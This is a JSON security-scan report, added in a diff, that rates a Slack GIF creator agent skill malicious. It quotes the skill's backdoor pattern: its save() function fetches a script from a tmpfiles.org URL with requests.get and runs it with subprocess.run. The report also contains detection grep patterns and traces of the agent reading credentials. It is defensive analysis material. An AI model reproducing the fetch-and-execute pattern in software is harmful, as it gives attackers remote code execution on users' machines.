@@ -1,0 +1,264 @@
+{
+  "status": "ok",
+  "outdir": "workshop_malicious_output_final/batch_detect_malicious/natemcgrady-slack-gif-creator-slack-gif-creator",
+  "skill_name": "natemcgrady-slack-gif-creator-slack-gif-creator",
+  "documented_purpose": "Dynamic analysis of installed agent skill based on observed runtime behavior",
+  "verdict": "malicious",
+  "score": 97.0,
+  "score_scale": "0-100",
+  "confidence": "high",
+  "num_patterns": 3,
+  "num_raw_patterns": 3,
+  "num_executed_patterns": 0,
+  "num_intent_only_patterns": 3,
+  "num_executed_malicious_patterns": 0,
+  "num_high_executed_patterns": 0,
+  "num_medium_executed_patterns": 0,
+  "num_strong_intent_patterns": 2,
+  "num_supporting_intent_patterns": 1,
+  "binary_mode": true,
+  "malicious_threshold": 80.0,
+  "suspicious_threshold": 40.0,
+  "aggregation_formula": "min(100, max(S) + 0.1 * sum(S_except_max)); high-risk executed evidence is >=100, strong blocked intent is >=85, weak/supporting-only evidence is capped at 60, and noise-only evidence is capped at 30",
+  "severity_weights": {
+    "low": 40,
+    "medium": 70,
+    "high": 100
+  },
+  "reason": "Dynamic risk score 97.0 exceeded the malicious threshold 80.0.",
+  "network_indicators": {
+    "contacted_domains": [
+      "api.anthropic.com",
+      "http-intake.logs.us5.datadoghq.com",
+      "tmpfiles.org"
+    ],
+    "contacted_ips": [
+      "172.17.0.2",
+      "169.254.169.254",
+      "160.79.104.10",
+      "34.149.66.137",
+      "172.67.161.137",
+      "104.21.15.43"
+    ],
+    "contacted_urls": [],
+    "embedded_urls": [
+      "https://tmpfiles.org/dl/21743264/slack_gif_helper.py"
+    ]
+  },
+  "execution_indicators": {
+    "command_patterns": [
+      "ls -la (skill dir, core/, templates/, __pycache__)",
+      "cat requirements.txt",
+      "grep -rnE for network/subprocess/eval/exec/base64/etc across *.py",
+      "python3 --version + import checks for PIL/numpy/imageio/requests",
+      "mkdir -p /home/appuser/workdir; created sample.gif (2054 bytes)",
+      "python3: core.validators.check_slack_size / validate_dimensions / get_optimization_suggestions on dummy gif",
+      "python3: core.easing.interpolate across all easing types",
+      "python3: core.color_palettes.get_palette for vibrant/pastel/dark/neon/professional",
+      "python3 -c socket.gethostbyname('tmpfiles.org')  (passive DNS only, no payload fetch)",
+      "43    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x5b6a0dd6e110 /* 22 vars */) = 0",
+      "44    execve(\"/usr/bin/cat\", [\"cat\", \"/tmp/user_prompt.txt\"], 0x5b6a0dd738d0 /* 22 vars */ <unfinished ...>",
+      "57    execve(\"/usr/bin/git\", [\"/usr/bin/git\", \"config\", \"--get\", \"remote.origin.url\"], 0x49dddb74510 /* 28 vars */) = 0",
+      "59    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--version\"], 0x49dddd8c640 /* 24 vars */) = 0",
+      "60    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--no-config\", \"--files\", \"--hidden\", \"--no-ignore\", \"--max-depth\", \"4\", \"--glob\", \".orphaned_at\", \"/home/appuser/.claude/plugins/cache\"], 0x49dddb76c10 /* 28 vars */) = 0",
+      "61    execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ps aux | grep -E \\\"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\\\" | grep -v grep\"], 0x49dde730a90 /* 29 vars */) = 0",
+      "62    execve(\"/usr/bin/ps\", [\"ps\", \"aux\"], 0x56106dabcc38 /* 29 vars */) = 0",
+      "63    execve(\"/usr/bin/grep\", [\"grep\", \"-E\", \"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\"], 0x56106dabcd18 /* 29 vars */ <unfinished ...>",
+      "64    execve(\"/usr/bin/grep\", [\"grep\", \"-v\", \"grep\"], 0x56106dabcc68 /* 29 vars */ <unfinished ...>",
+      "66    execve(\"/bin/zsh\", [\"/bin/zsh\", \"--version\"], 0x49dde731190 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "67    execve(\"/usr/bin/zsh\", [\"/usr/bin/zsh\", \"--version\"], 0x49dde731510 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "68    execve(\"/usr/local/bin/zsh\", [\"/usr/local/bin/zsh\", \"--version\"], 0x49dde731890 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "69    execve(\"/opt/homebrew/bin/zsh\", [\"/opt/homebrew/bin/zsh\", \"--version\"], 0x49dde731c10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "70    execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", \"env\"], 0x49dde731f90 /* 32 vars */) = 0",
+      "70    execve(\"/usr/bin/env\", [\"env\"], 0x63035e352790 /* 32 vars */) = 0",
+      "72    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x626047bb3c00 /* 31 vars */) = 0",
+      "74    execve(\"/usr/bin/cut\", [\"cut\", \"-d \", \"-f3\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "75    execve(\"/usr/bin/grep\", [\"grep\", \"-vE\", \"^_[^_]\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "78    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "80    execve(\"/usr/bin/grep\", [\"grep\", \"on\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "81    execve(\"/usr/bin/awk\", [\"awk\", \"{print \\\"set -o \\\" $1}\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "82    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x626047bbb820 /* 31 vars */) = 0",
+      "84    execve(\"/usr/bin/sed\", [\"sed\", \"s/^alias //g\"], 0x626047bbb820 /* 31 vars */) = 0",
+      "85    execve(\"/usr/bin/sed\", [\"sed\", \"s/^/alias -- /\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "86    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x626047bbb820 /* 31 vars */ <unfinished ...>",
+      "87    execve(\"/usr/bin/cat\", [\"cat\"], 0x626047bbb820 /* 31 vars */) = 0",
+      "88    execve(\"/usr/bin/cat\", [\"cat\"], 0x626047bbb820 /* 31 vars */) = 0",
+      "89    execve(\"/usr/bin/cat\", [\"cat\"], 0x626047bbb820 /* 31 vars */) = 0",
+      "92    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator\"], 0x57dbc06c8130 /* 34 vars */) = 0",
+      "95    execve(\"/usr/bin/cat\", [\"cat\", \"requirements.txt\"], 0x566c256e43d0 /* 34 vars */) = 0",
+      "96    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"core\"], 0x566c256e43d0 /* 34 vars */) = 0",
+      "97    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"templates\"], 0x566c256e43d0 /* 34 vars */) = 0",
+      "101   execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"ugrep\", \"-G\", \"--ignore-files\", \"--hidden\", \"-I\", \"--exclude-dir=.git\", \"--exclude-dir=.svn\", \"--exclude-dir=.hg\", \"--exclude-dir=.bzr\", \"--exclude-dir=.jj\", \"--exclude-dir=.sl\", \"-v\", \"__pycache__\"], 0x5ab7b78c0fa0 /* 33 vars */) = 0",
+      "100   execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"ugrep\", \"-G\", \"--ignore-files\", \"--hidden\", \"-I\", \"--exclude-dir=.git\", \"--exclude-dir=.svn\", \"--exclude-dir=.hg\", \"--exclude-dir=.bzr\", \"--exclude-dir=.jj\", \"--exclude-dir=.sl\", \"-rnE\", \"requests|urllib|socket|http|subprocess|os\\\\.system|eval\\\\(|exec\\\\(|__import__|pop...",
+      "109   execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"ugrep\", \"-G\", \"--ignore-files\", \"--hidden\", \"-I\", \"--exclude-dir=.git\", \"--exclude-dir=.svn\", \"--exclude-dir=.hg\", \"--exclude-dir=.bzr\", \"--exclude-dir=.jj\", \"--exclude-dir=.sl\", \"-iE\", \"gif_builder|requests|subprocess|http\"], 0x635244ee6e50 /* 33 vars */) = 0",
+      "108   execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"ugrep\", \"-G\", \"--ignore-files\", \"--hidden\", \"-I\", \"--exclude-dir=.git\", \"--exclude-dir=.svn\", \"--exclude-dir=.hg\", \"--exclude-dir=.bzr\", \"--exclude-dir=.jj\", \"--exclude-dir=.sl\", \"-rn\", \"import\", \"templates/bounce.py\", \"templates/explode.py\", \"templates/fade.py\", \"temp...",
+      "114   execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"core/__pycache__\"], 0x635244ecf480 /* 34 vars */) = 0",
+      "117   execve(\"/usr/local/bin/python3\", [\"python3\", \"--version\"], 0x5dd1dc4f3dc0 /* 34 vars */) = 0",
+      "118   execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"import PIL; print('pillow', PIL.__version__)\"], 0x5dd1dc4f3dc0 /* 34 vars */) = 0",
+      "119   execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"import numpy; print('numpy', numpy.__version__)\"], 0x5dd1dc4f3dc0 /* 34 vars */) = 0",
+      "120   execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"import imageio; print('imageio', imageio.__version__)\"], 0x5dd1dc4f3dc0 /* 34 vars */) = 0"
+    ],
+    "execution_parents": [
+      "id",
+      "cat",
+      "git",
+      "claude.exe",
+      "sh",
+      "ps",
+      "grep",
+      "zsh",
+      "bash",
+      "env",
+      "cut",
+      "head",
+      "awk",
+      "sed",
+      "ls",
+      "python3",
+      "mkdir",
+      "wc"
+    ],
+    "tool_call_patterns": [
+      "ls -la (skill dir, core/, templates/, __pycache__)",
+      "cat requirements.txt",
+      "grep -rnE for network/subprocess/eval/exec/base64/etc across *.py",
+      "python3 --version + import checks for PIL/numpy/imageio/requests",
+      "mkdir -p /home/appuser/workdir; created sample.gif (2054 bytes)",
+      "python3: core.validators.check_slack_size / validate_dimensions / get_optimization_suggestions on dummy gif",
+      "python3: core.easing.interpolate across all easing types",
+      "python3: core.color_palettes.get_palette for vibrant/pastel/dark/neon/professional",
+      "python3 -c socket.gethostbyname('tmpfiles.org')  (passive DNS only, no payload fetch)",
+      "{'command': 'GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this', 'reason': 'unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)'}",
+      "{'command': \"requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper)\", 'reason': 'unsafe remote script execution / fetch + run of attacker-controlled code'}",
+      "{'command': 'pip install pillow imageio imageio-ffmpeg numpy requests', 'reason': \"would enable the malicious save() path; 'requests' dependency exists only to support the backdoor — declined to install\"}",
+      "{'command': 'import/run of animation templates (shake/bounce/spin/etc.)', 'reason': \"all import core.gif_builder (pulls missing 'requests') and their demo paths call save(); could not run safely without enabling the RCE path\"}",
+      "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+      "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code"
+    ]
+  },
+  "file_indicators": {
+    "bundled_files": [],
+    "dropped_files": [
+      "{'path': '/home/appuser/.claude/.last-cleanup', 'after': '-rw-r--r--\\t24\\t2026-06-17 10:23:11.2356415220\\t/home/appuser/.claude/.last-cleanup'}",
+      "{'path': '/home/appuser/.claude/backups', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:25:18.7993137140\\t/home/appuser/.claude/backups'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781691785386', 'after': '-rw-r--r--\\t33\\t2026-06-17 10:23:05.3872290060\\t/home/appuser/.claude/backups/.claude.json.backup.1781691785386'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781691918799', 'after': '-rw-r--r--\\t24323\\t2026-06-17 10:25:18.7993137140\\t/home/appuser/.claude/backups/.claude.json.backup.1781691918799'}",
+      "{'path': '/home/appuser/.claude/policy-limits.json', 'after': '-rw-------\\t359\\t2026-06-17 10:23:05.8732815220\\t/home/appuser/.claude/policy-limits.json'}",
+      "{'path': '/home/appuser/.claude/projects', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:06.2038784030\\t/home/appuser/.claude/projects'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:11.1863641360\\t/home/appuser/.claude/projects/-home-appuser'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4.jsonl', 'after': '-rw-------\\t197989\\t2026-06-17 10:25:18.4857732500\\t/home/appuser/.claude/projects/-home-appuser/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4.jsonl'}",
+      "{'path': '/home/appuser/.claude/session-env', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:09.6371891360\\t/home/appuser/.claude/session-env'}",
+      "{'path': '/home/appuser/.claude/session-env/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:09.6371891360\\t/home/appuser/.claude/session-env/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4'}",
+      "{'path': '/home/appuser/.claude/sessions', 'after': 'drwx------\\t4096\\t2026-06-17 10:25:18.4541822830\\t/home/appuser/.claude/sessions'}",
+      "{'path': '/home/appuser/.claude/shell-snapshots', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:25:18.4581825520\\t/home/appuser/.claude/shell-snapshots'}",
+      "{'path': '/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__/color_palettes.cpython-310.pyc', 'after': '-rw-r--r--\\t6632\\t2026-06-17 10:24:33.9457688610\\t/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__/color_palettes.cpython-310.pyc'}",
+      "{'path': '/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__/easing.cpython-310.pyc', 'after': '-rw-r--r--\\t6458\\t2026-06-17 10:24:33.9374020560\\t/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__/easing.cpython-310.pyc'}",
+      "{'path': '/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__/validators.cpython-310.pyc', 'after': '-rw-r--r--\\t6020\\t2026-06-17 10:24:28.2594378320\\t/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__/validators.cpython-310.pyc'}",
+      "{'path': '/home/appuser/workdir/sample.gif', 'after': '-rw-r--r--\\t2054\\t2026-06-17 10:24:21.3705916280\\t/home/appuser/workdir/sample.gif'}",
+      "{'path': '/tmp/claude-1000', 'after': 'drwx------\\t4096\\t2026-06-17 10:23:09.6402601280\\t/tmp/claude-1000'}",
+      "{'path': '/tmp/claude-1000/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:09.6402601280\\t/tmp/claude-1000/-home-appuser'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:09.6407413280\\t/tmp/claude-1000/-home-appuser/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4/tasks', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:24:44.1138768610\\t/tmp/claude-1000/-home-appuser/07bd38e9-63d2-4fa8-a890-6d0b5c1747f4/tasks'}",
+      "{'path': '/tmp/fs_after.txt', 'after': '-rw-r--r--\\t0\\t2026-06-17 10:25:19.4722506310\\t/tmp/fs_after.txt'}",
+      "{'path': '/home/appuser', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:03.6951352930\\t/home/appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:25:18.8056731200\\t/home/appuser'}",
+      "{'path': '/home/appuser/.claude', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:03.6931351590\\t/home/appuser/.claude', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:11.2356415220\\t/home/appuser/.claude'}",
+      "{'path': '/home/appuser/.claude.json', 'before': '-rw-r--r--\\t33\\t2026-06-17 10:23:03.6951352930\\t/home/appuser/.claude.json', 'after': '-rw-r--r--\\t24406\\t2026-06-17 10:25:18.8002055130\\t/home/appuser/.claude.json'}",
+      "{'path': '/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:03.7045298790\\t/home/appuser/.claude/skills/natemcgrady-slack-gif-creator-slack-gif-creator/core/__pycache__', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:24:33.9459402180\\t/home/appuser/.claude/skill...",
+      "{'path': '/home/appuser/workdir', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 10:23:03.6951352930\\t/home/appuser/workdir', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 10:24:21.3570554150\\t/home/appuser/workdir'}",
+      "{'path': '/tmp', 'before': 'drwxrwxrwt\\t4096\\t2026-06-17 10:23:04.7542063940\\t/tmp', 'after': 'drwxrwxrwt\\t4096\\t2026-06-17 10:25:19.4722506310\\t/tmp'}",
+      "{'path': '/tmp/fs_before.txt', 'before': '-rw-r--r--\\t0\\t2026-06-17 10:23:04.7542063940\\t/tmp/fs_before.txt', 'after': '-rw-r--r--\\t5325\\t2026-06-17 10:23:04.7582066630\\t/tmp/fs_before.txt'}"
+    ],
+    "file_patterns": [
+      "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "/home/appuser/.claude/shell-snapshots"
+    ],
+    "certificate_fingerprints": []
+  },
+  "detected_malicious_patterns": [
+    {
+      "pattern": "command_injection_or_code_execution_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains command-injection, shell-execution, or RCE-style malicious primitive indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "all easing types python3: core.color_palettes.get_palette for vibrant/pastel/dark/neon/professional python3 -c socket.gethostbyname('tmpfiles.org') (passive dns only, no payload fetch)",
+          "es\", \"python3: core.color_palettes.get_palette for vibrant/pastel/dark/neon/professional\", \"python3 -c socket.gethostbyname('tmpfiles.org') (passive dns only, no payload fetch)\" ], \"commands_skipped\": [ { \"command\": \"gifbuilder.save(.",
+          "s https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)\" }, { \"command\": \"requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper)\","
+        ],
+        "commands_skipped": [
+          "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+          "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code",
+          "pip install pillow imageio imageio-ffmpeg numpy requests | reason: would enable the malicious save() path; 'requests' dependency exists only to support the backdoor — declined to install",
+          "import/run of animation templates (shake/bounce/spin/etc.) | reason: all import core.gif_builder (pulls missing 'requests') and their demo paths call save(); could not run safely without enabling the RCE path"
+        ],
+        "skipped_unsafe_commands": [
+          "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+          "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code"
+        ]
+      },
+      "evidence_short": "primitive=all easing types python3: core.color_palettes.get_palette for vibrant/pastel/dark/neon/professional python3 -c socket.gethostbyname('tmpfiles.org') (passive dns only, no payload...; command=GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper..."
+    },
+    {
+      "pattern": "backdoor_or_malicious_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains backdoor, reverse-shell, bind-shell, or hidden malicious behavior indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "lack gif creator\" toolkit, and most of its code genuinely is that. however, **`core/gif_builder.py` contains a remote-code-execution backdoor** embedded in the single most central, most-invoked function of the entire toolkit. ### the malicious code (`core/gif_builder.py`) - **li"
+        ],
+        "commands_skipped": [
+          "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+          "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code",
+          "pip install pillow imageio imageio-ffmpeg numpy requests | reason: would enable the malicious save() path; 'requests' dependency exists only to support the backdoor — declined to install",
+          "import/run of animation templates (shake/bounce/spin/etc.) | reason: all import core.gif_builder (pulls missing 'requests') and their demo paths call save(); could not run safely without enabling the RCE path"
+        ],
+        "skipped_unsafe_commands": [
+          "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+          "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code"
+        ]
+      },
+      "evidence_short": "primitive=lack gif creator\" toolkit, and most of its code genuinely is that. however, **`core/gif_builder.py` contains a remote-code-execution backdoor** embedded in the single most centr...; command=GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper..."
+    },
+    {
+      "pattern": "unsafe_command_skipped",
+      "severity": "medium",
+      "base_weight": 70,
+      "effective_score": 35.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "medium",
+      "summary": "Unsafe command was identified and skipped during safe sandbox execution.",
+      "evidence": {
+        "skipped_unsafe_commands": [
+          "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+          "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code"
+        ],
+        "unsafe_command_instructions": [
+          "remote script",
+          "GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper.py via requests and executes it via subprocess (remote code execution backdoor)",
+          "requests.get('https://tmpfiles.org/dl/21743264/slack_gif_helper.py') + subprocess.run(helper) | reason: unsafe remote script execution / fetch + run of attacker-controlled code"
+        ]
+      },
+      "evidence_short": "skipped=GIFBuilder.save(...)  — every SKILL.md example and all 13 templates call this | reason: unsafe remote script — save() downloads https://tmpfiles.org/dl/21743264/slack_gif_helper..."
+    }
+  ]
+}
